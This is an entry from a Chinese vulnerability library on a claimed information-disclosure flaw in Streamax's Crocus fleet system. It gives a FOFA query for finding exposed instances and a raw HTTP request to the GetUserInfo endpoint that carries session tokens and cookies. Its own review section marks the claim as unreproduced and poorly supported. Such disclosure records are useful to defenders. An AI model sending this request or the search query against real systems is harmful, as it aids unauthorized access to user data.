---
source: "wy876 漏洞文库"
id: "vw-de9fc81a423b255459ce1d19"
entity_id: "ve-de9fc81a423b255459ce1d19"
schema_version: "1"
fofa_unverified: "body="
title: "深圳市锐明技术股份有限公司Crocus系统存在敏感信息泄露漏洞"
product: "Streamax锐明Crocus"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "Token/JSESSIONID/Saffron.U均在请求，版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E6%99%BA%E8%83%BD%E8%AE%BE%E5%A4%87/%E9%94%90%E6%98%8E%E6%8A%80%E6%9C%AF/%E6%B7%B1%E5%9C%B3%E5%B8%82%E9%94%90%E6%98%8E%E6%8A%80%E6%9C%AF%E8%82%A1%E4%BB%BD%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8Crocus%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/lr4dgs05xzsvh5l3"
source_status: "recorded"
---

# 深圳市锐明技术股份有限公司Crocus系统存在敏感信息泄露漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Streamax锐明Crocus
- 本文讨论：Home.do GetUserInfo
- 版本、权限与配置前提：Token/JSESSIONID/Saffron.U均在请求，版本未知
- 资料类型：用户信息请求；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 有身份材料却无响应和预期访问边界，敏感信息泄露结论不足
- 冗长产品背景及残缺元数据
- 已落实的文本修订：残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 接口返回的是当前本人还是越权他人信息待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
锐明技术作为一家专注于AI和视频技术的商用车智能物联（AIoT）解决方案提供商，Crocus系统是其核心产品之一。Crocus系统旨在利用人工智能、高清视频、大数据和自动驾驶技术，帮助商用车减少交通事故和货物丢失，提高企业或车队的运营效率。通过车载摄像头、毫米波雷达等传感器，实现对车辆周围环境的实时感知和监控，提高驾驶安全性。利用AI技术，系统能够识别车辆和行人的身份，并分析驾驶员的驾驶行为，及时提醒驾驶员注意潜在风险。Crocus系统能够实时监控货箱状态，包括货物是否丢失、货箱是否关闭等，并通过3D检测技术实现更精准的货物识别和管理。深圳市锐明技术股份有限公司Crocus系统存在敏感信息泄露漏洞

# 二、影响版本
+ Crocus系统

# 三、资产测绘
+ fofa`body="/ThirdResource/respond/respond.min.js" && title="Crocus"`
+ 特征


# 四、漏洞复现
```http
GET /Home.do?Action=GetUserInfo&Type=Get&Guid=1724206435273 HTTP/1.1
Host: 
Accept: */*
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Token: d2JzczoxNzI0MjA2NDIwNzU2
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=234DBD0F52D9D798CB9931DEDA75131A; Saffron.U=VUlEPTEmVU49Y3JvY3VzJkdJRD0xNzI0MjA3NDQ5NTI2ODYmUklEPTEmTT1CTWFwJklOUz0x
X-Requested-With: XMLHttpRequest
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/lr4dgs05xzsvh5l3>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
